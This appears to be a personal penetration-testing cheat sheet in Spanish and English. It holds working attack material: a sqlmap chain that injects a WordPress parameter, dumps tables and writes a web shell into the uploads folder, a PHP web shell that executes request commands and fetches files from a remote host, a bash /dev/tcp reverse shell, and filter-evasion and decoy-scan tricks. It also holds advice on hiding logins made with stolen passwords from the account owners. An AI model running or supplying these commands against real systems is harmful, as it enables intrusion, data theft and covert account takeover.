# Enumeration

## nmap

```

-sC : Default Scripts, this does not include safe scripts
-sV : Enumerate versions
-oA : Output all formats, give a name

```

# VPN via SSH

```
sshuttle -r jeipi@132.248.124.168:37241 -x 132.248.124.168 0/0 -vv

# Puertos Abiertos IPs Publicas CERT
    6424 y 37241

```

`https://www.techrepublic.com/article/how-to-use-ssh-as-a-vpn-with-sshuttle/`

## Ip Pública

```apacheconf
curl ipinfo.io ; echo                               # json con toda la info
curl ifconfig.me ; echo                             # solo la IP
dig +short myip.opendns.com @resolver1.opendns.com  # solo la IP
```

# sqlmap

```apacheconf
sqlmap -u https://example.com/dir/dir/dir/example_resource.php --data 'id=88&idcal=3435' --cookie 'PHPSESSID=9asdfasdf7as9dfas7df; wfvt_4265345=fsdfasfdasdf' -p id

# Es un wordpress
# --data se obtiene con un proxy analizando la peticion
# --cookie tambien se optiene con un proxy
# -p es el parametro el cual se va a inyectar se descubrio que era inyectable por que ejecutaba operaciones aritmeticas basicas acceder al id 3 es lo mismo que acceder al 8-5
```

```apacheconf
sqlmap -u https://example.com/dir/dir/dir/example_resource.php --data 'id=88&idcal=3435' --cookie 'PHPSESSID=9asdfasdf7as9dfas7df; wfvt_4265345=fsdfasfdasdf' -p id --dbms=mysql --technique=U
```

```apacheconf
sqlmap -u https://example.com/dir/dir/dir/example_resource.php --data 'id=88&idcal=3435' --cookie 'PHPSESSID=9asdfasdf7as9dfas7df; wfvt_4265345=fsdfasfdasdf' -p id --is-dba
```

```apacheconf
sqlmap -u https://example.com/dir/dir/dir/example_resource.php --data 'id=88&idcal=3435' --cookie 'PHPSESSID=9asdfasdf7as9dfas7df; wfvt_4265345=fsdfasfdasdf' -p id --dbs
```

```apacheconf
sqlmap -u https://example.com/dir/dir/dir/example_resource.php --data 'id=88&idcal=3435' --cookie 'PHPSESSID=9asdfasdf7as9dfas7df; wfvt_4265345=fsdfasfdasdf' -p id -D users --tables
```

```apacheconf
sqlmap -u https://example.com/dir/dir/dir/example_resource.php --data 'id=88&idcal=3435' --cookie 'PHPSESSID=9asdfasdf7as9dfas7df; wfvt_4265345=fsdfasfdasdf' -p id -D users --T alumnos --columns
```

```apacheconf
sqlmap -u https://example.com/dir/dir/dir/example_resource.php --data 'id=88&idcal=3435' --cookie 'PHPSESSID=9asdfasdf7as9dfas7df; wfvt_4265345=fsdfasfdasdf' -p id -D users --sql-shell
```

```apache
sql-shell> SELECT option_value from smewp.wp_options where option_name LIKE '%upload%'

# Obtiene un json que parece ser la estructura de un json para cargar una imagen
```

```apache
weevely generate pasword ~/dir/webshell.php
# Generar Web Shell con authenticacion
```

```
sqlmap -u https://example.com/dir/dir/dir/example_resource.php --data 'id=88&idcal=3435' --cookie 'PHPSESSID=9asdfasdf7as9dfas7df; wfvt_4265345=fsdfasfdasdf' -p id -D users --file-write=webshell.php --file-dest=/var/www/wp-content/uploads/2016/05/webshell.php
```

```apache
# Si falla subir un archivo se puede intentar descargar uno

Script Perl



```

```apache
# Buscar en archivos php

grep -rn FILE
grep -rn md5

php -l user

touch -t 04190842 user.php
```

```apache
# Cuando uses contraseñas para acceder desde otros lados usa IPs de la misma ciudad o al menos del mismo pais y copia el user agent para que no reciban emails sobre un nuevo dispositivo iniciando sesion en su cuenta.
```

# nmap

## Firewall Evasion
### Decoy

```apache
nmap -sS -sV -F -D RND:3 nmap.scanme.org
nmap -sS -sV -F -D 10.0.0.1,10.0.0.2,10.0.0.3 nmap.scanme.org
```

## Drupal

```zsh

    https://github.com/tibillys/drupscan # outdated
    https://github.com/droope/droopescan # updated

    ### Files

    /CHANGELOG.txt

```

## php

```php

# Access Interactive Mode

php -a

# Test php

<?php phpinfo(); ?>

# Custom WebShell

$phpCode = <<<'EoC'
<?php
	if(isset($_REQUEST['upload'])) {
		file_put_contents($_REQUEST['upload'], file_get_contents("http://10.10.15.151:8000/" . $_REQUEST['upload']));
	};
	if(isset($_REQUEST['exec'])) {
		system($_REQUEST['exec']);
	};
	if(isset($_REQUEST['PoC'])) {
		echo "<h1>" . $_REQUEST['PoC'] . "</h1>";
	};
?>
EoC;

# HackTheBox - Bastard [IppSec]

```

## Web Browser Plugins

```zsh
Cookies Manager +
```

# Port Forwarding
## SSH Tunneling

```zsh
    
    # Este comando forwardea un servicio corriendo en un host remoto <remote_host_bind_ip_address>
    # en un puerto <remote_host_port> de manera local en la maquina remota a un puerto en nuestra
    # maquina local <local_host_port>.

    # Se ejecuta en el equipo local.

    ssh -L <local_host_port>:<remote_host_bind_ip_address>:<remote_host_port> <remote_user_with_service_privileges>@<remote_ip_address>
```
```zsh
    # Reverse Forward
    
    # Se ejecuta en el equipo remoto.

    ssh -R <attacker_port>:<victim_bind_ip_address>:<victim_port> <attacker_user>@<attacker_ip_address>
```

`chisel`

```zsh
Attacker
./chisel server -p <tcp_tunnel_port> --reverse
Victim
./chisel client <attacker_ip>:<tcp_tunnel_port> R:<attacker_local_port>:127.0.0.1:<victim_local_port_to_be_forwarded>
```
```zsh
https://github.com/securesocketfunneling/ssf
```

## searchsploit

```zsh
    searchsploit -x php/webapps/41564.php   # View Exploit Source Code
    searchsploit -p 41564                   # Copy Exploit Path to Clipboard
```

## Web Fuzzing

```zsh
dirsearch.py -u http://box.htb/ -e .

ffuf -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://46.101.33.243:32620/forum/FUZZ -recursion -recursion-depth 1 -e .php -v

Vhost fuzzing

ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:31241/ -H 'Host: FUZZ.academy.htb' -fs 986

GET Parameter Fuzzing

ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:30177/admin/admin.php?FUZZ=key -fs 798

POST Parameter Fuzzing

ffuf -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx

```

## Reverse Shell

```zsh
# bash -c because this shell is specially crafted to work with bash interpreter another interpreter may not work
bash -c 'bash -i >& /dev/tcp/ip_address/port 0>&1'
```

## Escaping Space Char
```
${IFS}
${,}
```

# Discovery
## Test Port Open
```zsh
# Inmediatly Close Connection and Verbose Options
nc -zv 10.10.10.10 3003
```

# Web Fuzzing / Directory & File Discovery

```
ffuf -w /SecLists/Discovery/Web-Content/directory-list-2.3/medium.txt -u https://sub.domain.htb/FUZZ
```

